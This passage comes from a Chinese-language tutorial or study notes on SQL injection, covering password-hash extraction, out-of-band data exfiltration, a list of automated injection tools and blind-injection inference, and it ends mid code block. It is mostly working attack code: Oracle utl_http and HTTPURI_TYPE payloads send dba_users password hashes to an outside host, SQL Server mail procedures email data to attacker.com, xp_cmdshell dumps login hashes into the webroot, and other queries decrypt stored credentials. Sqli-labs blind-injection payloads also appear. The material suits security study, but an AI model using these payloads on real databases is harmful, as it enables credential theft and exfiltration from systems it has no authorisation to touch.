<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">HASH</span> <span class="token operator">=</span> <span class="token string">'md5'</span> <span class="token operator">||</span> MD5<span class="token punctuation">(</span><span class="token string">'foobar'</span><span class="token punctuation">)</span> <span class="token operator">=</span> md53858f62230ac3c915f300c664312c63f
<span class="token comment">-- foo是password，bar是username </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="Oracle-2"><a href="#Oracle-2" class="headerlink" title="Oracle"></a>Oracle</h4><p>Oracle在sys.user$表的password列存储数据库账户的哈希口令。dba_users视图指向该表，但从Oracle 11g开始，数据加密标准(Data Encryption Standard, DES)的哈希口令不再出现在 dba_user视图中。sys.user$表包含数据库用户(type#=1)和数据库角色(type#=0)的哈希口令。</p>
<p>针对Oracle DES用户名口令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 andlength(password)=16</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>针对Oracle DES角色口令：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> sys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#=1</span>
andlength<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>针对 Oracle SHA1 口令(11g+)：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">Select</span> username<span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token keyword">hash</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span>spare4<span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span> salt fromsys<span class="token punctuation">.</span><span class="token keyword">user</span>$ <span class="token keyword">where</span> <span class="token keyword">type</span><span class="token comment">#&gt;0 and length(spare4)=62;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sysman.mgmt_credentials2表是通常能找到的SYS用户明文口令的示例。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- get the cleartext password of the user MGMT_VIEW (generated by Oracle during the installation time, looks like a hash but is a password) </span>
<span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span>
<span class="token comment">-- get the password of the dbsnmp user, databases listener and OS credentials</span>
<span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> sysmanuser<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_value<span class="token punctuation">)</span> Password <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t1<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>mgmt_credentials2 t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>credential_guid<span class="token operator">=</span>t2<span class="token punctuation">.</span>credential_guid
<span class="token operator">and</span> lower<span class="token punctuation">(</span>t1<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'username'</span>
<span class="token operator">and</span> lower<span class="token punctuation">(</span>t2<span class="token punctuation">.</span>credential_set_column<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'password'</span>
<span class="token comment">-- get the username and password of the Oracle Knowledgebase Metalink </span>
<span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_USERNAME<span class="token punctuation">)</span><span class="token punctuation">,</span>sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ARU_PASSWORD<span class="token punctuation">)</span> <span class="token keyword">from</span> SYSMAN<span class="token punctuation">.</span>MGMT_ARU_CREDENTIALS<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="Oracle组件"><a href="#Oracle组件" class="headerlink" title="Oracle组件"></a>Oracle组件</h5><ul>
<li>APEX</li>
<li>Oracle Internet Directory</li>
</ul>
<h3 id="带外通信"><a href="#带外通信" class="headerlink" title="带外通信"></a>带外通信</h3><p>用于发送请求的HTTP(S)连接被用于接收响应。不过也有例外的情况：可以通过完全不同的信道来传输结果。我们称这样的通信 为“带外”，或简称为OOB(Out Of Band)。</p>
<h4 id="e-mail"><a href="#e-mail" class="headerlink" title="e-mail"></a>e-mail</h4><p>攻击者需要做的是构造一种利用，通过它来提取想要的信息，将数据打包到e-mail中并使用专门的数据库函数插入到e-mail队列中。之后该e-mail就会出现在攻击者的邮箱中。</p>
<h5 id="MS-Server"><a href="#MS-Server" class="headerlink" title="MS Server"></a>MS Server</h5><p>SQL Mail（SQL Server 2000、2005 和 2008）和 Database Mail（SQL Server 2005 和 2008）</p>
<ul>
<li><p>SQL Mail</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_startmail<span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_sendmail <span class="token variable">@recipients</span> <span class="token operator">=</span> <span class="token string">'admin@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@query</span> <span class="token operator">=</span><span class="token string">'select @@version'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li><p>Database Mail</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--Enable Database Mail</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_configure <span class="token string">'Database Mail XPs'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">RECONFIGURE</span>
<span class="token comment">-- Create a new account, MYACC. The SMTP server is provided in this call. </span>
<span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_add_account_sp<span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'MYACC'</span><span class="token punctuation">,</span><span class="token variable">@email_address</span><span class="token operator">=</span><span class="token string">'hacked@victim.com'</span><span class="token punctuation">,</span><span class="token variable">@display_name</span><span class="token operator">=</span><span class="token string">'mls'</span><span class="token punctuation">,</span><span class="token variable">@mailserver_name</span><span class="token operator">=</span><span class="token string">'smtp.victim.com'</span><span class="token punctuation">,</span>
<span class="token variable">@account_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span>
<span class="token comment">-- Create a new profile, MYPROFILE</span>
<span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_adci_profile_sp<span class="token variable">@profile_name</span><span class="token operator">=</span> <span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@description</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">,</span> <span class="token variable">@profile_id</span><span class="token operator">=</span><span class="token boolean">NULL</span><span class="token punctuation">;</span>
<span class="token comment">-- Bind the account to the profile</span>
<span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysmail_add_profileaccount_sp <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span><span class="token variable">@account_name</span><span class="token operator">=</span><span class="token string">'acc'</span><span class="token punctuation">,</span><span class="token variable">@sequence_number</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token comment">-- Retrieve login</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@b</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token variable">@b</span><span class="token operator">=</span><span class="token keyword">SYSTEM_USER</span><span class="token punctuation">;</span>
<span class="token comment">-- Send the mail</span>
<span class="token keyword">EXEC</span> msdb<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sp_send_dbmail <span class="token variable">@profile_name</span><span class="token operator">=</span><span class="token string">'MYPROFILE'</span><span class="token punctuation">,</span>@
recipients<span class="token operator">=</span><span class="token string">'allyrbase@attacker.com'</span><span class="token punctuation">,</span> <span class="token variable">@subject</span><span class="token operator">=</span><span class="token string">' system user'</span><span class="token punctuation">,</span><span class="token variable">@body</span><span class="token operator">=</span><span class="token variable">@b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h5 id="Oracle-3"><a href="#Oracle-3" class="headerlink" title="Oracle"></a>Oracle</h5><p>UTL_SMTP提供了一系列函数来启动并管理一个SMTP连接：先使 用UTL_SMTP.OPEN_CONNECTION与服务器取得联系，之后使用UTL_SMTP.HELLO向服务器发送“HELLO”消息，接着分别使用UTL_SMTP.MAIL和UTL_SMTP.RCP指定发送者和接收者，接下来使用UTL_SMTP.DATA指定消息，最后使用UTL_SMTP.QUIT终止会话。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">UTL_MAIL<span class="token punctuation">.</span>SEND<span class="token punctuation">(</span>sender<span class="token punctuation">,</span> recipient<span class="token punctuation">,</span> cc<span class="token punctuation">,</span> bcc<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> mime_type<span class="token punctuation">,</span> priority<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="HTTP-DNS"><a href="#HTTP-DNS" class="headerlink" title="HTTP/DNS"></a>HTTP/DNS</h4><p>Oracle 还提供了两种执行 HTTP 请求的方法:UTL_ HTTP 和 HTTPURI TYPEoUTL_ HTTP 包和HTTPURI_TYPE对象类型默认授权给了公共角色，可以由数据库所有用户执行或通过 SQL注入加以执行。</p>
<p>要想向远程系统发送SYS用户的哈希口令，可注入下列字符串：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> l<span class="token operator">=</span>utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以借助于HTTPURI_TYPE对象类型，如下所示：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span>HTTPURI_TYPE<span class="token punctuation">(</span><span class="token string">'http://www.orasploit.com/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">select</span> password <span class="token keyword">from</span> dba_users <span class="token keyword">where</span> rownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getclob<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果SQL查询写在URL内部，那么还可以通过域名系统(Domain Name System,DNS)查询来发送数据(最大为64字节)。该查询作用于外部站点</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span> utl_http<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'http://www.'</span><span class="token operator">||</span><span class="token punctuation">(</span>selectpasswordfromdba_userswhererownum<span class="token operator">=</span>l<span class="token punctuation">)</span><span class="token operator">||</span><span class="token string">'.orasploit.com/'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h4><p>如果攻击者拥有足够的写文件系统的权限，那么他就可以将查询结果重定向到Web服务器根目录下的一个文件中，之后他便可以使用浏览器来正常访问该文件。</p>
<h5 id="SQL-Server-3"><a href="#SQL-Server-3" class="headerlink" title="SQL Server"></a>SQL Server</h5><p>检索sql_logins表中第一个用户的用户名和哈希，将该值重定向到文件系统的一个文本文件中</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Declare needed variables</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@a</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token variable">@hash</span> nvarchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">int</span><span class="token punctuation">;</span>
<span class="token comment">-- Take the username and password hash of the first user in sql_logins </span>
<span class="token comment">-- and store it into the variable @hash</span>
<span class="token keyword">SELECT</span> <span class="token keyword">top</span> <span class="token number">1</span> <span class="token variable">@hash</span> <span class="token operator">=</span> name <span class="token operator">+</span><span class="token string">'|'</span><span class="token operator">+</span>master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins<span class="token punctuation">;</span> 
<span class="token comment">-- Create a FileSystemObject pointing to the location of the desired file</span>
<span class="token keyword">EXEC</span> sp_OACreate <span class="token string">'Scripting.FileSystemObject'</span><span class="token punctuation">,</span> <span class="token variable">@a</span> <span class="token keyword">OUT</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@a</span><span class="token punctuation">,</span><span class="token string">'OpenTextFile'</span><span class="token punctuation">,</span> <span class="token variable">@fileid</span> <span class="token keyword">OUT</span><span class="token punctuation">,</span> <span class="token string">'c:\inetpub\wwwroot\hash.txt'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token comment">-- Write the @hash variable into that file</span>
<span class="token keyword">EXEC</span> sp_OAMethod <span class="token variable">@fileid</span><span class="token punctuation">,</span> <span class="token string">'WriteLine'</span><span class="token punctuation">,</span> <span class="token boolean">Null</span><span class="token punctuation">,</span> <span class="token variable">@hash</span><span class="token punctuation">;</span> 
<span class="token comment">-- Destroy the objects that are not needed anymore</span>
<span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@fileid</span><span class="token punctuation">;</span>
<span class="token keyword">EXEC</span> sp_OADestroy <span class="token variable">@a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用自带工具bcp.exe</p>
<p>检索整张sql_logins表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> xp_cmdshell <span class="token string">'bcp "select * from sys.sql_logins" queryout c:\inetpub\wwwroot\hashes.txt -T -c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="Mysql-2"><a href="#Mysql-2" class="headerlink" title="Mysql"></a>Mysql</h5><p>为确定用户是否拥有FILE权限，可使用下面两种查询之一进行测试</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> file_priv <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span><span class="token string">'username'</span> <span class="token comment">-- MySQL 4/5</span>

<span class="token keyword">SELECT</span> grantee<span class="token punctuation">,</span>is_grantable <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges <span class="token keyword">WHERE</span> privilege_type <span class="token operator">=</span> <span class="token string">'file'</span> <span class="token operator">AND</span> grantee <span class="token operator">=</span><span class="token string">'username'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>假设用户拥有这样的权限，而且知道Web站点的根目录为/webroot/且MySQL用户能够对该目录进行写访问，那么可注入下列查询：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'/webroot/tables.txt'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="Oracle-4"><a href="#Oracle-4" class="headerlink" title="Oracle"></a>Oracle</h5><p>在Oracle中，大多数用于访问文件的方法(UTL_FILE、DBMS_LOB外部表和Java)都需要一个PL/SQL注入漏洞，因而无法被用到SQL注入场景中。</p>
<h5 id="在移动设备上实施SQL注入"><a href="#在移动设备上实施SQL注入" class="headerlink" title="在移动设备上实施SQL注入"></a>在移动设备上实施SQL注入</h5><p>SQLite</p>
<p>建立监听通信</p>
<h3 id="自动利用SQL注入"><a href="#自动利用SQL注入" class="headerlink" title="自动利用SQL注入"></a>自动利用SQL注入</h3><h4 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h4><p><a target="_blank" rel="noopener" href="http://sqlmap.sourceforge.net/">http://sqlmap.sourceforge.net</a></p>
<h4 id="Bobcat"><a href="#Bobcat" class="headerlink" title="Bobcat"></a>Bobcat</h4><p><a target="_blank" rel="noopener" href="http://www.northem-monkee.co.uk/projects/bobcat/bobcat.html">www.northem-monkee.co.uk/projects/bobcat/bobcat.html</a></p>
<h4 id="BSQL"><a href="#BSQL" class="headerlink" title="BSQL"></a>BSQL</h4><p><a target="_blank" rel="noopener" href="http://code.google.eom/p/bsqlhacker/">http://code.google.eom/p/bsqlhacker/</a></p>
<h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><ul>
<li><p>FG-Injection Framework (<a target="_blank" rel="noopener" href="http://sourceforge.net/projects/injection-fwk/">http://sourceforge.net/projects/injection-fwk/</a>)</p>
</li>
<li><p>Havij (<a target="_blank" rel="noopener" href="http://itsecteam.com/en/projects/projectl.htm">http://itsecteam.com/en/projects/projectl.htm</a>)</p>
</li>
<li><p>Sqllnjector (<a target="_blank" rel="noopener" href="http://www.woanware.co.uk/?page_id=19">http://www.woanware.co.uk/?page_id=19</a>)</p>
</li>
<li><p>SQLGET (<a target="_blank" rel="noopener" href="http://www.infbbytecom.ar/">www.infbbytecom.ar</a>)</p>
</li>
<li><p>Sqlsus (<a target="_blank" rel="noopener" href="http://sqlsus.sourcefbrge.net/">http://sqlsus.sourcefbrge.net/</a>)</p>
</li>
<li><p>Pangolin (<a target="_blank" rel="noopener" href="http://www.nosec-inc.com/en/products/pangolin/">http://www.nosec-inc.com/en/products/pangolin/</a>)</p>
</li>
<li><p>Absinthe (<a target="_blank" rel="noopener" href="http://0x90.org/releases/absinthe/">http://0x90.org/releases/absinthe/</a>)</p>
</li>
</ul>
<h2 id="SQL盲注利用"><a href="#SQL盲注利用" class="headerlink" title="SQL盲注利用"></a>SQL盲注利用</h2><p>在发现一个SQL注入点时，只返回一个简单错误提示，返回的内容并不能完美的达到预期，这时我们能注入不同的内容注入产生不同回应，通过差异判断注入是否成功，这就是SQL盲注，通常是自动化利用</p>
<h3 id="寻找并确认SQL盲注"><a href="#寻找并确认SQL盲注" class="headerlink" title="寻找并确认SQL盲注"></a>寻找并确认SQL盲注</h3><h4 id="强制产生通用错误"><a href="#强制产生通用错误" class="headerlink" title="强制产生通用错误"></a>强制产生通用错误</h4><p>通常提交单引号时最常见的错误源是受损的SQL查询</p>
<h4 id="注入带副作用的查询"><a href="#注入带副作用的查询" class="headerlink" title="注入带副作用的查询"></a>注入带副作用的查询</h4><p>注入副作用的查询是为了让攻击者观察到，通常是注入时间延迟</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">waitfor</span> delay <span class="token string">'0:0:5'</span>

sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

pg_sleep<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 注入不同的字符串产生不同的输出</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">2</span>  <span class="token comment">-- 永假</span>
<span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token comment">-- 永真</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="拆分与平衡"><a href="#拆分与平衡" class="headerlink" title="拆分与平衡"></a>拆分与平衡</h4><p>分解合法输入的操作称为拆分，平衡则保证最终的查询中不会包含不平衡的结尾单引号。其基本思想是：收集合法的请求参数，之后使用SQL关键字对它们进行修改以保证与原始数据不同， 但当数据库解析它们时，二者的功能是等价的。</p>
<p>oracle中<code>||</code>连接两个字符串</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span>

<span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadB'</span><span class="token operator">||</span><span class="token string">'ob'</span>
<span class="token comment">-- 返回结果是相同的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review authors<span class="token operator">=</span><span class="token string">'MadBob'</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">0x42</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'ob'</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'ob'</span>
<span class="token keyword">SELECT</span> <span class="token function">COUNT</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span>
<span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review author<span class="token operator">=</span><span class="token string">'Mad'</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'Bob'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以看到，在其中注入了子查询，当然我们可以换成其他的漏洞代码</p>
<p><img src="https://images.dadream.eu.org/images/2024/07/1635b29c12fca4d4f03c3fa7f6557976.png"></p>
<h4 id="常见的SQL盲注场景"><a href="#常见的SQL盲注场景" class="headerlink" title="常见的SQL盲注场景"></a>常见的SQL盲注场景</h4><p>1） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容可被适度控制的页面。这种情况通常出现在根据用户选择来显示信息的页面中。例如，用户点击一个包含id参数（能唯一识别数据库中的商品）的链接或者提交一个搜索请求。对于这两种情况，用户可控制页面提供的输出，因为该页面是根据用户提供的信息来生成的，比如提供一个产品的id，该页面还包含了从响应中获得的数据。</p>
<p>因为页面提供了反馈信息（虽然不是以详细的数据库错误消息方式），所以可以使用基于时间的确认漏洞以及能够修改页面显示数据集的漏洞。例如，某个攻击可能会显示香皂或刷子的产品描述，以指示是否提取到了 0-bit或1-bit的数据。大多数情况下，只需提交一个单引号就足以破坏SQL查询平衡并强制产生一个通用的错误页面，这将有助于推断是否存在SQL注入漏洞。</p>
<p>2） 提交一个导致SQL查询无效的漏洞时会返回一个通用的错误页面，而提交正确的SQL时则会返回一个内容不可控的页面。当页面包含多个SQL查询，但只有第一个查询容易受到攻击且不产生输出时会碰到这种情况。还有一种场景也会引发这种情况：SQL注入位于 UPDATE或INSERT语句中，此时提交的信息虽然被写入数据库中且不产生输出，但却会产生通用的错误。</p>
<p>使用单引号产生的通用错误页面可能会暴露这种页面（与基于时间的漏洞相同），但基于内容的攻击却不会。</p>
<p>3） 提交受损或不正确的SQL既不会产生错误页面，也不会以任何方式影响页面输出。因 为这种类型的SQL盲注场景不返回错误，而基于时间的漏洞或产生带外副作用的漏洞则最有可能成功识别易受攻击的参数。</p>
<h4 id="SQL盲注技术"><a href="#SQL盲注技术" class="headerlink" title="SQL盲注技术"></a>SQL盲注技术</h4><h5 id="推断攻击技术"><a href="#推断攻击技术" class="headerlink" title="推断攻击技术"></a>推断攻击技术</h5><p>当请求的位为1时，响应会有专门的标志；而当请求的位为0时，则会产生不同的响应。响应中的真正差异取决于所选用的推断工具，所使用的方法则大多基于响应时间、页面内容、页面错误或以上这些因素的组合。</p>
<p>条件分支IF语句，攻击者能通过响应的不同推断出是哪个分支</p>
<p>sqli-labs示例</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-8/?id=1</span>
<span class="token comment">#you are in</span>
http:<span class="token comment">//sql/Less-8/?id=1' and '1'='1</span>
<span class="token comment">#you are in</span>
http:<span class="token comment">//sql/Less-8/?id=1' and '1'='2</span>
<span class="token comment">#</span>
http:<span class="token comment">//sql/Less-8/?id=1' or '1'='1</span>
<span class="token comment">#you are in</span>
<span class="token comment">#可以看到有两种状态，空白和you are in</span>
http:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),1,1)))=115 %23</span>
<span class="token comment">#you are in</span>
可以判断数据库第一个字符是s
http:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),2,1)))=101 %23</span>
<span class="token comment">#you are in</span>
经过多次注入就能将数据全部检索出来
http:<span class="token comment">//sql/Less-8/?id=1' and (length(database()))=8 %23</span>
<span class="token comment">#you are in</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="增加推断攻击技术的复杂性"><a href="#增加推断攻击技术的复杂性" class="headerlink" title="增加推断攻击技术的复杂性"></a>增加推断攻击技术的复杂性</h5><ul>
<li><p>二分搜素方法（分半算法）</p>
<p>两种状态，添加第三种状态可以将最佳请求次数降为1，也可以自己创建字母表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1)) &gt;127-- (False)
Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">63</span><span class="token comment">-- (True)</span>
Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1) )&gt;95-- (True)
